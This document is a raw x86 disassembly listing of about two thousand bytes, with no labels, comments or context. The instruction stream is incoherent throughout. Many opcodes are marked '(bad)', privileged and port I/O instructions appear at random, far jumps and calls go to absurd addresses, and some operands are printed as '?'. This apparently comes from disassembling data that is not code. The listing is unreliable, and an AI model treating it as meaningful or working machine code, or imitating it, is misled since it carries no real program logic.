  419c5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c5b:	mov    ch,0x8d
  419c5d:	iret   
  419c5e:	rol    DWORD PTR [edi],1
  419c60:	sti    
  419c61:	cld    
  419c62:	push   esi
  419c63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c64:	rcl    BYTE PTR [edi-0x5ff50449],cl
  419c6a:	jbe    0x419cbc
  419c6c:	and    BYTE PTR [eax-0x5d5082c5],0x2a
  419c73:	hlt    
  419c74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c75:	dec    edx
  419c76:	cmp    DWORD PTR [ebx+0x1],ebp
  419c79:	push   ebx
  419c7a:	inc    edx
  419c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c7c:	fnsave [eax-0x723fb1cc]
  419c82:	jle    0x419c8e
  419c84:	xchg   edx,eax
  419c85:	sub    eax,0x4614d1c5
  419c8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c8b:	pop    es
  419c8c:	cmp    bl,dl
  419c8e:	je     0x419c93
  419c90:	sbb    dl,cl
  419c92:	and    ebp,DWORD PTR [ebx+0x59872b4d]
  419c98:	dec    ebx
  419c99:	pop    ds
  419c9a:	cld    
  419c9b:	cmp    eax,0x3ffccac8
  419ca0:	jecxz  0x419d01
  419ca2:	bound  ecx,QWORD PTR [edi-0x3d]
  419ca5:	mov    edx,0x520746a5
  419caa:	adc    al,0xae
  419cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cad:	dec    ebp
  419cae:	mov    DWORD PTR [ecx+0x7cfdae10],edx
  419cb4:	pop    ecx
  419cb5:	popa   
  419cb6:	xchg   DWORD PTR [edx+0x10a4b5b],eax
  419cbc:	shl    DWORD PTR [edx-0x40e1eb89],0xa0
  419cc3:	sub    eax,0xcaed6a00
  419cc8:	lea    edx,[eax]
  419cca:	jge    0x419cb3
  419ccc:	add    al,0xe6
  419cce:	mov    ebp,?
  419cd0:	pusha  
  419cd1:	fdiv   DWORD PTR [ebx]
  419cd3:	pop    ss
  419cd4:	popf   
  419cd5:	pop    edi
  419cd6:	popa   
  419cd7:	mov    edx,0xdf161711
  419cdc:	xchg   esi,eax
  419cdd:	clc    
  419cde:	repz sbb BYTE PTR [edx-0x19f8efb8],dl
  419ce5:	stos   BYTE PTR es:[edi],al
  419ce6:	sgdtd  [ebp-0x6f]
  419cea:	div    BYTE PTR [esp+edx*4-0x74]
  419cee:	aad    0x29
  419cf0:	stc    
  419cf1:	pop    ebx
  419cf2:	enter  0x397d,0x65
  419cf6:	fdivr  st,st(0)
  419cf8:	pop    edi
  419cf9:	das    
  419cfa:	ds (bad) 
  419cfd:	or     BYTE PTR [edi],0xa5
  419d00:	mov    al,0xf3
  419d02:	sub    dl,bl
  419d04:	outs   dx,BYTE PTR ds:[esi]
  419d05:	inc    esi
  419d06:	lods   al,BYTE PTR ds:[esi]
  419d07:	or     edx,0xffffffa4
  419d0a:	dec    esp
  419d0b:	push   0xb9590215
  419d10:	scas   al,BYTE PTR es:[edi]
  419d11:	mov    al,0x9d
  419d13:	enter  0xdc27,0xb6
  419d17:	mov    dl,BYTE PTR [ecx+0x218a9bc8]
  419d1d:	pop    ecx
  419d1e:	aad    0x66
  419d20:	xchg   edi,eax
  419d21:	cmp    BYTE PTR [edx-0x66303a1a],ch
  419d27:	pop    esi
  419d28:	stc    
  419d29:	imul   ebp,DWORD PTR [ebp+0x3c684a30]
  419d30:	int    0xa4
  419d32:	in     al,0x99
  419d34:	pop    esi
  419d35:	and    DWORD PTR [esi],esp
  419d37:	popf   
  419d38:	(bad)  
  419d3a:	fiadd  DWORD PTR [ecx]
  419d3c:	call   0x4b148032
  419d41:	lods   al,BYTE PTR ds:[esi]
  419d42:	pop    esp
  419d43:	push   0x3c569580
  419d48:	call   0xec355605
  419d4d:	sahf   
  419d4e:	fldcw  WORD PTR [esi-0x6cbd60a6]
  419d54:	ret    0xe5ad
  419d57:	loopne 0x419dbf
  419d59:	out    dx,al
  419d5a:	inc    eax
  419d5b:	xchg   DWORD PTR [edi+edx*4],ecx
  419d5e:	shl    BYTE PTR [edx],1
  419d60:	jmp    DWORD PTR [edi+esi*8-0x5f0a9f99]
  419d67:	call   0x29a5e2b6
  419d6c:	adc    ch,BYTE PTR [ecx+0x61c5a0b3]
  419d72:	sub    eax,0x2c03e5f8
  419d77:	fld    DWORD PTR [edx]
  419d79:	mov    ds:0xf3731560,eax
  419d7e:	add    bh,BYTE PTR [ecx-0x45ebcce4]
  419d84:	les    ebp,FWORD PTR [ebx-0x3e]
  419d87:	addr16 icebp 
  419d89:	mov    ah,BYTE PTR [edx]
  419d8b:	xor    al,0x71
  419d8d:	sub    al,0x7d
  419d8f:	or     al,0x16
  419d91:	push   0x13
  419d93:	in     eax,dx
  419d94:	mov    al,ds:0x23385e75
  419d99:	(bad)  
  419d9a:	out    0xb9,eax
  419d9c:	sub    BYTE PTR [esi-0x9],ch
  419d9f:	mov    eax,ds:0xea5ee3b4
  419da4:	call   0x4b56890d
  419da9:	es dec eax
  419dab:	ret    0xae3f
  419dae:	add    eax,0xe4c2ed3
  419db3:	aad    0xcb
  419db5:	clc    
  419db6:	or     eax,0xcf55fa59
  419dbb:	sub    al,0x62
  419dbd:	dec    edi
  419dbe:	imul   esi,DWORD PTR [edx+0x77ae70a1],0xffffffa9
  419dc5:	mov    ch,0x0
  419dc7:	mov    ch,0xe4
  419dc9:	stos   DWORD PTR es:[edi],eax
  419dca:	inc    ebp
  419dcb:	jnp    0x419dec
  419dcd:	(bad)  
  419dce:	cmp    eax,0xa95eb203
  419dd3:	adc    al,ah
  419dd5:	add    al,0x77
  419dd7:	cmp    al,0xe6
  419dd9:	bound  ebx,QWORD PTR [ecx]
  419ddb:	(bad)  
  419ddd:	repnz inc ebx
  419ddf:	fs dec ebx
  419de1:	xor    al,0x24
  419de3:	push   esp
  419de4:	ret    
  419de5:	xchg   BYTE PTR [edi+0x4bb477d2],bh
  419deb:	jnp    0x419e28
  419ded:	and    ah,ch
  419def:	lahf   
  419df0:	jne    0x419e0a
  419df2:	inc    eax
  419df3:	std    
  419df4:	xor    al,bl
  419df6:	stc    
  419df7:	out    0xf4,al
  419df9:	sub    bh,bl
  419dfb:	pop    edx
  419dfc:	test   al,0xbd
  419dfe:	jbe    0x419df6
  419e00:	cmp    BYTE PTR [ebx+edx*4-0x3e9ae0cd],ch
  419e07:	std    
  419e08:	and    ebp,edx
  419e0a:	sub    DWORD PTR [ebp-0x11bfc9d6],eax
  419e10:	sbb    eax,0x89a245f3
  419e15:	jl     0x419def
  419e17:	mov    eax,0xe377593a
  419e1c:	jmp    0x419e67
  419e1e:	retf   
  419e1f:	mov    bl,0x13
  419e21:	retf   
  419e22:	mov    bh,0x89
  419e24:	stos   DWORD PTR es:[edi],eax
  419e25:	cld    
  419e26:	dec    edx
  419e27:	out    dx,eax
  419e28:	out    0x12,eax
  419e2a:	lea    esi,[edi]
  419e2c:	cmp    eax,0x84490e58
  419e31:	jae    0x419ded
  419e33:	out    0x21,al
  419e35:	ds inc esp
  419e37:	rol    BYTE PTR fs:[ebp+0x24168d88],1
  419e3e:	mov    edx,0xc6b5ed8c
  419e43:	mov    esp,0x556c88b4
  419e48:	jnp    0x419e89
  419e4a:	int    0x2c
  419e4c:	and    esp,ebp
  419e4e:	lea    esi,[edx+0x1533437f]
  419e54:	push   esp
  419e55:	and    eax,0x73620afc
  419e5a:	lds    ecx,FWORD PTR [edi+ebp*4-0x5]
  419e5e:	mov    ah,0x4
  419e60:	inc    edx
  419e61:	pop    ebx
  419e62:	pop    ebp
  419e63:	add    esp,0x655ae831
  419e69:	jns    0x419e2c
  419e6b:	pop    edi
  419e6c:	ins    DWORD PTR es:[edi],dx
  419e6d:	inc    eax
  419e6e:	inc    edx
  419e6f:	xchg   edi,eax
  419e70:	out    0x5,al
  419e72:	fdivr  DWORD PTR [edx+0x7369196b]
  419e78:	add    dh,BYTE PTR ds:0x2259b645
  419e7e:	enter  0xff33,0x61
  419e82:	cs inc ebp
  419e84:	mov    al,dh
  419e86:	sbb    esp,DWORD PTR [ebx-0x68]
  419e89:	or     al,0x56
  419e8b:	add    dl,ch
  419e8d:	or     edx,DWORD PTR [ebp-0x7d]
  419e90:	jb     0x419e62
  419e92:	clc    
  419e93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e94:	mov    eax,0x6b4849b6
  419e99:	mov    edx,ds
  419e9b:	jo     0x419f1a
  419e9d:	push   0x4ee3c61c
  419ea2:	std    
  419ea3:	call   DWORD PTR [eax+0x4b]
  419ea6:	test   al,0x55
  419ea8:	adc    ah,BYTE PTR [edx-0xe]
  419eab:	(bad)  [edx+edx*8+0x162250c2]
  419eb2:	repnz pop edi
  419eb4:	test   al,0x53
  419eb6:	(bad)  
  419eb7:	or     eax,0xe3a51e2a
  419ebc:	int    0x74
  419ebe:	push   0x78325252
  419ec3:	iret   
  419ec4:	mov    ?,WORD PTR [ebx+0x203a5c06]
  419eca:	push   0xffffff88
  419ecc:	out    dx,al
  419ecd:	and    esi,DWORD PTR [ecx+0x2b9b1b5c]
  419ed3:	and    BYTE PTR [edi+0x7c51b4e9],ch
  419ed9:	sub    esp,esp
  419edb:	scas   eax,DWORD PTR es:[edi]
  419edc:	je     0x419e9b
  419ede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419edf:	repnz mov ds:0x2a37b92c,eax
  419ee5:	add    BYTE PTR [edx+0x34],0xe4
  419ee9:	jmp    FWORD PTR [ecx]
  419eeb:	pop    edx
  419eec:	in     al,dx
  419eed:	neg    dh
  419eef:	int3   
  419ef0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ef1:	les    edi,FWORD PTR [eax+0x5e]
  419ef4:	in     eax,dx
  419ef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ef6:	pop    ss
  419ef7:	(bad)  [ebp-0x3d7fb52a]
  419efd:	cs scas eax,DWORD PTR es:[edi]
  419eff:	fisub  WORD PTR [eax]
  419f01:	out    dx,eax
  419f02:	or     eax,0xc22b8cd
  419f07:	mov    WORD PTR [eax+eiz*1],ds
  419f0a:	fistp  QWORD PTR [ebp+0x64]
  419f0d:	inc    esi
  419f0e:	push   esp
  419f0f:	fwait
  419f10:	and    edx,DWORD PTR [edi-0x78]
  419f13:	push   esp
  419f14:	mov    ebx,0xa20e720b
  419f19:	pop    edx
  419f1a:	inc    edx
  419f1b:	and    BYTE PTR [ebp+eiz*4-0x4f4ecf63],bl
  419f22:	pop    edx
  419f23:	or     dh,BYTE PTR [ebp-0x721ef410]
  419f29:	jne    0x419ee9
  419f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f2c:	dec    esp
  419f2d:	mov    esi,0xaa62a68d
  419f32:	test   al,0x73
  419f34:	ins    BYTE PTR es:[edi],dx
  419f35:	je     0x419f4b
  419f37:	adc    DWORD PTR [edi+0x5a],ecx
  419f3a:	mov    DWORD PTR [ecx],edx
  419f3c:	outs   dx,BYTE PTR ds:[esi]
  419f3d:	add    al,0x7f
  419f3f:	push   ss
  419f40:	aam    0x6c
  419f42:	push   ecx
  419f43:	(bad)  
  419f44:	jp     0x419f72
  419f46:	popf   
  419f47:	add    edx,DWORD PTR [edi-0x47]
  419f4a:	fisubr WORD PTR [esi+0x65]
  419f4d:	jg     0x419f2c
  419f4f:	xor    DWORD PTR [ebx+0xf],ebp
  419f52:	push   ds
  419f53:	jns    0x419f62
  419f55:	fimul  DWORD PTR [edi]
  419f57:	xchg   ecx,eax
  419f58:	out    0x6a,eax
  419f5a:	mov    edi,0xc2eb23c0
  419f5f:	es cmp DWORD PTR ds:[ebp-0x36],esp
  419f64:	dec    esp
  419f65:	sub    bl,BYTE PTR [esi-0x28c169d9]
  419f6b:	sbb    al,0xa3
  419f6d:	ret    0xbfad
  419f70:	aam    0x68
  419f72:	sbb    eax,edi
  419f74:	das    
  419f75:	cmp    DWORD PTR [ecx],ecx
  419f77:	loopne 0x419fe8
  419f79:	add    al,0x9d
  419f7b:	sub    al,0x20
  419f7d:	(bad)  
  419f7e:	sbb    ecx,DWORD PTR [edx+edi*4-0x1c]
  419f82:	sub    BYTE PTR [eiz*8+0x7f8f184b],0xd0
  419f8a:	into   
  419f8b:	sahf   
  419f8c:	mov    DWORD PTR [eax],ecx
  419f8e:	aam    0x15
  419f90:	jae    0x419fba
  419f92:	lock xchg ebp,eax
  419f94:	dec    edi
  419f95:	(bad)  
  419f96:	mov    BYTE PTR [ebx+edi*8],0xe0
  419f9a:	imul   ebx,DWORD PTR [ecx],0x1ac8ba87
  419fa0:	ins    DWORD PTR es:[edi],dx
  419fa1:	xchg   edx,eax
  419fa2:	inc    edx
  419fa3:	stos   BYTE PTR es:[edi],al
  419fa4:	lock repnz sub eax,0xdb252f8c
  419fab:	jp     0x419ff0
  419fad:	retf   0x685b
  419fb0:	dec    edi
  419fb1:	xor    edx,DWORD PTR [eax]
  419fb3:	jle    0x419fd1
  419fb5:	xor    cl,ch
  419fb7:	dec    esp
  419fb8:	jae    0x419f5f
  419fba:	out    0x48,al
  419fbc:	pop    eax
  419fbd:	or     al,0x45
  419fbf:	sub    BYTE PTR [esp+eax*4+0x1b],bl
  419fc3:	retf   0x25b5
  419fc6:	xchg   ebp,eax
  419fc7:	fst    DWORD PTR ds:0x14908ca4
  419fcd:	mov    dl,0xbf
  419fcf:	in     al,dx
  419fd0:	xchg   ebp,eax
  419fd1:	add    dl,dl
  419fd3:	add    DWORD PTR ds:0x71b9fb94,edi
  419fd9:	mov    al,ds:0x5cfa121
  419fde:	push   edx
  419fdf:	outs   dx,DWORD PTR ds:[esi]
  419fe0:	scas   eax,DWORD PTR es:[edi]
  419fe1:	or     ah,dh
  419fe3:	imul   ebp,DWORD PTR [edx],0xffffffd2
  419fe6:	loop   0x41a037
  419fe8:	and    ch,BYTE PTR [edi]
  419fea:	xor    al,bh
  419fec:	inc    ebx
  419fed:	cmp    DWORD PTR [ecx-0x55aa8e5],0xe07c7f58
  419ff7:	les    esi,FWORD PTR [edi]
  419ff9:	sub    DWORD PTR [ebx+0x7f],0x43
  419ffd:	push   esp
  419ffe:	dec    ebp
  419fff:	mov    ?,WORD PTR [ebx+0x61907cb2]
  41a005:	outs   dx,DWORD PTR ds:[esi]
  41a006:	jbe    0x41a031
  41a008:	ficomp DWORD PTR [ebp-0x73da6f9d]
  41a00e:	lahf   
  41a00f:	mov    edx,0xdd9fc9b3
  41a014:	test   eax,0xb9c29973
  41a019:	push   ss
  41a01a:	aad    0xad
  41a01c:	mov    ebp,0x8044b22d
  41a021:	rcl    ch,cl
  41a023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a024:	add    al,0xde
  41a026:	lods   al,BYTE PTR ds:[esi]
  41a027:	push   edi
  41a028:	jo     0x41a017
  41a02a:	les    esp,FWORD PTR [ecx+0x6b3f61ff]
  41a030:	inc    esi
  41a031:	sbb    eax,0x8997c5a7
  41a036:	std    
  41a037:	dec    esp
  41a038:	nop
  41a039:	mov    dh,0xff
  41a03b:	push   cs
  41a03c:	add    edx,esi
  41a03e:	jnp    0x41a043
  41a040:	bound  ebp,QWORD PTR [eax]
  41a042:	add    edi,esi
  41a044:	stos   BYTE PTR es:[edi],al
  41a045:	icebp  
  41a046:	add    eax,0xf476d716
  41a04b:	mov    eax,edi
  41a04d:	push   es
  41a04e:	dec    ecx
  41a04f:	push   edx
  41a050:	jl     0x41a013
  41a052:	add    ebp,edi
  41a054:	push   cs
  41a055:	cmp    eax,0x746815fd
  41a05a:	(bad)  
  41a05b:	popa   
  41a05c:	inc    edi
  41a05d:	mov    BYTE PTR [edx-0x28],cl
  41a060:	aad    0x8b
  41a062:	push   ecx
  41a063:	add    DWORD PTR [edx],esi
  41a065:	ror    DWORD PTR [eax-0x1b],0xed
  41a069:	in     al,dx
  41a06a:	mov    BYTE PTR [ecx-0x3e],dh
  41a06d:	ror    BYTE PTR ds:0x1d0d4b8e,1
  41a073:	int    0xf4
  41a075:	jb     0x41a063
  41a077:	outs   dx,DWORD PTR ds:[esi]
  41a078:	mov    ecx,0x62c1e963
  41a07d:	mov    DWORD PTR [esi],ebp
  41a07f:	mov    edi,0xf11605d9
  41a084:	sub    al,0x1c
  41a086:	or     ecx,edx
  41a088:	mov    bl,0xbe
  41a08a:	sub    eax,0xae7e4e02
  41a08f:	lock sbb al,0xb
  41a092:	call   FWORD PTR [esi]
  41a094:	pop    ebp
  41a095:	(bad)  [ebx+0x4040a4b]
  41a09b:	pop    ss
  41a09c:	sbb    eax,0x60685979
  41a0a1:	popf   
  41a0a2:	add    al,0x37
  41a0a4:	sbb    al,0xcc
  41a0a6:	and    al,bl
  41a0a8:	pushf  
  41a0a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0aa:	loopne 0x41a0be
  41a0ac:	mov    edx,0x8244b32f
  41a0b1:	cwde   
  41a0b2:	icebp  
  41a0b3:	ret    0xa7a
  41a0b6:	xchg   edx,eax
  41a0b7:	pop    esi
  41a0b8:	jmp    0x41a09b
  41a0ba:	imul   ebx,DWORD PTR [ecx],0x79
  41a0bd:	push   ebp
  41a0be:	inc    esi
  41a0bf:	cs or  eax,0x23fa4845
  41a0c5:	pop    edi
  41a0c6:	cdq    
  41a0c7:	ja     0x41a0bf
  41a0c9:	arpl   bx,bx
  41a0cb:	mov    ch,BYTE PTR [ecx+0x60]
  41a0ce:	xor    al,BYTE PTR [ebp-0x59]
  41a0d1:	sbb    BYTE PTR [edx+0x25],bl
  41a0d4:	xchg   BYTE PTR [esi+0x67],ah
  41a0d7:	adc    DWORD PTR [eax],esi
  41a0d9:	inc    eax
  41a0da:	pop    ecx
  41a0db:	sbb    edx,DWORD PTR [edi+0x73059f65]
  41a0e1:	and    eax,0x57073277
  41a0e6:	fimul  WORD PTR [esi]
  41a0e8:	icebp  
  41a0e9:	add    BYTE PTR [esi-0x36b7a8bd],ch
  41a0ef:	xchg   ecx,eax
  41a0f0:	mov    al,ds:0x87599719
  41a0f5:	fistp  QWORD PTR ds:0x20bab32c
  41a0fb:	push   0x35
  41a0fd:	inc    ebp
  41a0fe:	and    eax,0x688fe543
  41a103:	jmp    0x8a456ea1
  41a108:	adc    al,0xd4
  41a10a:	je     0x41a115
  41a10c:	call   FWORD PTR [edi-0x489b0afc]
  41a112:	sti    
  41a113:	call   0x6456:0x6993e698
  41a11a:	push   ebx
  41a11b:	cwde   
  41a11c:	inc    ebx
  41a11d:	mov    ds:0x1de3aceb,eax
  41a122:	mov    ecx,0xf1a30a74
  41a127:	cld    
  41a128:	mov    BYTE PTR [edi],dh
  41a12a:	lods   al,BYTE PTR ds:[esi]
  41a12b:	fstp   QWORD PTR [ecx+0x6d]
  41a12e:	jl     0x41a0ea
  41a130:	mov    al,ds:0xf606d88b
  41a135:	pop    edx
  41a136:	fxch   st(3)
  41a138:	leave  
  41a139:	sub    eax,0x7bb06b5f
  41a13e:	and    eax,0x32fee3fa
  41a143:	add    DWORD PTR [edi],eax
  41a145:	sti    
  41a146:	int    0x25
  41a148:	aaa    
  41a149:	arpl   WORD PTR ds:0x4d7d9ba7,si
  41a14f:	(bad)  
  41a150:	lds    eax,FWORD PTR [eax-0xa]
  41a153:	mov    edx,0x6203c049
  41a158:	sub    ah,0xe3
  41a15b:	out    0xba,eax
  41a15d:	mov    ebp,0x72447f5a
  41a162:	loopne 0x41a1ae
  41a164:	mov    eax,0x3a8be974
  41a169:	mov    ds:0xf742648e,eax
  41a16e:	bound  esi,QWORD PTR [ebx-0x112f4b0f]
  41a174:	mov    ebp,0x1d495b50
  41a179:	xchg   edi,eax
  41a17a:	add    edi,DWORD PTR [di+0x120]
  41a17f:	jmp    0x3aa2:0x314ac19f
  41a186:	int    0xc9
  41a188:	pushw  cs
  41a18a:	jg     0x41a132
  41a18c:	cwde   
  41a18d:	fs popa 
  41a18f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a190:	push   edx
  41a191:	push   0x4
  41a193:	dec    DWORD PTR [ebx]
  41a195:	popa   
  41a196:	and    eax,0xdfebb090
  41a19b:	in     al,dx
  41a19c:	imul   ecx,DWORD PTR [ebx+0x33a96d98],0xfd442038
  41a1a6:	inc    eax
  41a1a7:	mov    ds:0x6ac632fb,al
  41a1ac:	pusha  
  41a1ad:	popf   
  41a1ae:	test   al,al
  41a1b0:	xchg   DWORD PTR [ebx-0x61],eax
  41a1b3:	inc    eax
  41a1b4:	dec    ebx
  41a1b5:	not    BYTE PTR [eax+0x45]
  41a1b8:	mov    ds:0xcaeb7940,al
  41a1bd:	mov    ebp,0x93aa9c4a
  41a1c2:	mov    ebp,ebx
  41a1c4:	mov    bl,0x98
  41a1c6:	inc    eax
  41a1c7:	and    BYTE PTR [ebp-0x1a],ah
  41a1ca:	push   esi
  41a1cb:	clc    
  41a1cc:	icebp  
  41a1cd:	inc    esp
  41a1ce:	and    al,0x8c
  41a1d0:	mov    ebx,?
  41a1d2:	dec    ebx
  41a1d3:	jbe    0x41a254
  41a1d5:	dec    esp
  41a1d6:	push   ebx
  41a1d7:	xor    edx,DWORD PTR [ecx+0x40]
  41a1da:	inc    ecx
  41a1db:	sbb    ebp,DWORD PTR [eax-0x5a]
  41a1de:	dec    esp
  41a1df:	dec    ebp
  41a1e0:	pop    edi
  41a1e1:	fidiv  WORD PTR [edi-0x8a8294]
  41a1e7:	add    BYTE PTR [eax-0x13576a1b],bl
  41a1ed:	cs cmp eax,0x36cf9556
  41a1f3:	scas   eax,DWORD PTR es:[edi]
  41a1f4:	jbe    0x41a1e3
  41a1f6:	mov    al,ds:0xf2f4516d
  41a1fb:	je     0x41a1bb
  41a1fd:	inc    esi
  41a1fe:	in     eax,0x39
  41a200:	cmc    
  41a201:	pop    bx
  41a203:	(bad)  
  41a205:	stc    
  41a206:	sub    dh,BYTE PTR [edx-0x2897a65]
  41a20c:	loop   0x41a242
  41a20e:	fdivr  st,st(7)
  41a210:	sbb    al,dh
  41a212:	(bad)  
  41a213:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a214:	xchg   edx,eax
  41a215:	xchg   DWORD PTR [edi-0x12],edi
  41a218:	call   0xe86d:0xdeb80efb
  41a21f:	jg     0x41a22d
  41a221:	popf   
  41a222:	ret    
  41a223:	test   DWORD PTR [edi],ebx
  41a225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a226:	inc    ecx
  41a227:	pop    ss
  41a228:	ja     0x41a26d
  41a22a:	inc    ebx
  41a22b:	xor    DWORD PTR ds:0x77a819ab,ebx
  41a231:	std    
  41a232:	xor    eax,ebx
  41a234:	mov    DWORD PTR [ebx-0x148442ee],edx
  41a23a:	mov    bh,0x8d
  41a23c:	aad    0x82
  41a23e:	dec    ebx
  41a23f:	jo     0x41a2bd
  41a241:	and    BYTE PTR ds:0x1398a0e,al
  41a247:	sbb    BYTE PTR [esi],cl
  41a249:	(bad)  
  41a24a:	idiv   ebx
  41a24c:	sub    bh,BYTE PTR [edi-0x54]
  41a24f:	aas    
  41a250:	xor    BYTE PTR [ebx],0xac
  41a253:	outs   dx,BYTE PTR ds:[esi]
  41a254:	fs dec eax
  41a256:	sub    BYTE PTR [esp+ebx*4-0x4e],0x2b
  41a25b:	pop    esi
  41a25c:	popa   
  41a25d:	(bad)  
  41a25e:	mov    edx,0x1a090333
  41a263:	xlat   BYTE PTR ds:[ebx]
  41a264:	(bad)  [edi+0x45]
  41a267:	std    
  41a268:	lock cmp DWORD PTR [ecx],esp
  41a26b:	pop    esp
  41a26c:	pop    ebp
  41a26d:	pop    edx
  41a26e:	sbb    dl,BYTE PTR [eax]
  41a270:	pop    edi
  41a271:	popa   
  41a272:	adc    esi,DWORD PTR [esi]
  41a274:	jmp    0x48c6:0x95d9f1fc
  41a27b:	xor    al,0x3
  41a27d:	pop    edx
  41a27e:	xor    BYTE PTR [edi+0x37732bf7],al
  41a284:	inc    esp
  41a285:	outs   dx,BYTE PTR ds:[esi]
  41a286:	rcr    edx,cl
  41a288:	mov    ss:0x99abe877,al
  41a28e:	int    0xf1
  41a290:	push   ecx
  41a291:	adc    DWORD PTR [edi+0x4e700d01],esi
  41a297:	inc    edx
  41a298:	add    eax,0xbd98a296
  41a29d:	(bad)  
  41a29e:	sbb    eax,0xec838437
  41a2a3:	aas    
  41a2a4:	shr    BYTE PTR [eax+0x4c],1
  41a2a7:	fisubr WORD PTR [ebx-0x23b3ab26]
  41a2ad:	arpl   WORD PTR [ebx],di
  41a2af:	mov    ah,0x3c
  41a2b1:	add    ebx,eax
  41a2b3:	push   ebp
  41a2b4:	xchg   esp,eax
  41a2b5:	enter  0x37c4,0x91
  41a2b9:	rcr    dh,0x2a
  41a2bc:	xor    al,0x51
  41a2be:	sti    
  41a2bf:	mov    al,ch
  41a2c1:	pop    ds
  41a2c2:	cmp    cl,BYTE PTR cs:[ecx-0x6]
  41a2c6:	popa   
  41a2c7:	mov    dl,0xaa
  41a2c9:	aas    
  41a2ca:	jno    0x41a2e5
  41a2cc:	add    al,0xc7
  41a2ce:	xor    al,BYTE PTR [ebx+0x2f0440b1]
  41a2d4:	ins    BYTE PTR es:[edi],dx
  41a2d5:	arpl   WORD PTR [eax],si
  41a2d7:	sub    esi,esp
  41a2d9:	cmp    esp,DWORD PTR [edi+0x532ffad6]
  41a2df:	and    al,0x48
  41a2e1:	jmp    0x4cad:0xfcbb096
  41a2e8:	cdq    
  41a2e9:	or     BYTE PTR [ecx],cl
  41a2eb:	dec    edi
  41a2ec:	push   edx
  41a2ed:	iret   
  41a2ee:	pop    esi
  41a2ef:	xor    dl,BYTE PTR [eax-0x6fb6bf7c]
  41a2f5:	dec    ecx
  41a2f6:	mov    DWORD PTR [ebp-0xa],ebx
  41a2f9:	outs   dx,BYTE PTR ds:[esi]
  41a2fa:	sahf   
  41a2fb:	mov    al,0xe5
  41a2fd:	call   0x7b38d176
  41a302:	sbb    al,0xe8
  41a304:	imul   edi,DWORD PTR [ebx-0x5897a696],0x358ad250
  41a30e:	shr    BYTE PTR [ecx+esi*1],cl
  41a311:	lds    ebp,FWORD PTR [eax]
  41a313:	scas   al,BYTE PTR es:[edi]
  41a314:	or     eax,0xc2c04567
  41a319:	aad    0x4
  41a31b:	jno    0x41a310
  41a31d:	cmp    edi,eax
  41a31f:	(bad)
  41a323:	lds    edi,FWORD PTR [ebp+0x1eb830d4]
  41a329:	jnp    0x41a374
  41a32b:	cmp    DWORD PTR [edi+0x6094143],0xa9839a1d
  41a335:	shr    BYTE PTR [edx],cl
  41a337:	pop    eax
  41a338:	lahf   
  41a339:	mov    ah,0xa6
  41a33b:	add    DWORD PTR [ebp+0x1],esp
  41a33e:	in     al,dx
  41a33f:	scas   eax,DWORD PTR es:[edi]
  41a340:	sbb    BYTE PTR [edi+0x5d],cl
  41a343:	pop    ebx
  41a344:	(bad)  
  41a345:	jmp    0xbe3c:0xc16711ce
  41a34c:	fisttp WORD PTR [eax-0x253c7016]
  41a352:	mov    ds:0xfe2b25d6,eax
  41a357:	sbb    DWORD PTR [ebx+eiz*1-0x4444b5e2],ebp
  41a35e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a35f:	mov    ch,0x13
  41a361:	test   cl,ch
  41a363:	cld    
  41a364:	pop    edi
  41a365:	pusha  
  41a366:	push   ss
  41a367:	push   ebx
  41a368:	idiv   BYTE PTR [esi-0x4081fbf2]
  41a36e:	sahf   
  41a36f:	jns    0x41a3ee
  41a371:	in     eax,dx
  41a372:	add    BYTE PTR [ebx+0x2cbdf057],ah
  41a378:	adc    al,BYTE PTR [eax+0x5201b272]
  41a37e:	inc    ebx
  41a37f:	pop    ebp
  41a380:	ret    
  41a381:	cs mov ebx,0xda285291
  41a387:	push   ss
  41a388:	or     edi,DWORD PTR ds:[ebx-0x69]
  41a38c:	pop    ecx
  41a38d:	push   ebx
  41a38e:	test   DWORD PTR [edi+0xfed025e],edx
  41a394:	fisub  DWORD PTR [edi-0x3c2fd349]
  41a39a:	and    eax,0x131e12ab
  41a39f:	jge    0x41a3d6
  41a3a1:	xor    eax,0x6e9509b5
  41a3a6:	or     al,0x73
  41a3a8:	mov    esp,0xfb10fa0b
  41a3ad:	jne    0x41a32f
  41a3af:	inc    esp
  41a3b0:	in     eax,0xc9
  41a3b2:	adc    eax,0x2788dda3
  41a3b7:	sbb    esi,ebx
  41a3b9:	xchg   edx,eax
  41a3ba:	movups xmm1,xmm5
  41a3bd:	outs   dx,DWORD PTR ds:[esi]
  41a3be:	mov    BYTE PTR [esi-0x13],ch
  41a3c1:	mov    dl,dh
  41a3c3:	enter  0x7e5f,0x23
  41a3c7:	dec    esp
  41a3c8:	hlt    
  41a3c9:	cmp    eax,0xe568b04b
  41a3ce:	xor    BYTE PTR [ecx+ebp*8+0x10996c50],al
  41a3d5:	xor    edi,DWORD PTR [edx+edx*1]
  41a3d8:	out    dx,eax
  41a3d9:	fdiv   DWORD PTR [ebx+0x3c]
  41a3dc:	stos   DWORD PTR es:[edi],eax
  41a3dd:	leave  
  41a3de:	dec    edi
  41a3df:	clc    
  41a3e0:	sub    DWORD PTR [edx-0x50f63afc],ecx
  41a3e6:	sub    BYTE PTR [esi],ah
  41a3e8:	dec    esi
  41a3e9:	mov    al,0xf2
  41a3eb:	ficomp WORD PTR [eax+0xc]
  41a3ee:	mov    ebp,0xbc9aa58
  41a3f3:	(bad)  
  41a3f4:	pop    ds
  41a3f5:	fldcw  WORD PTR [ebx]
  41a3f7:	pushf  
  41a3f8:	lahf   
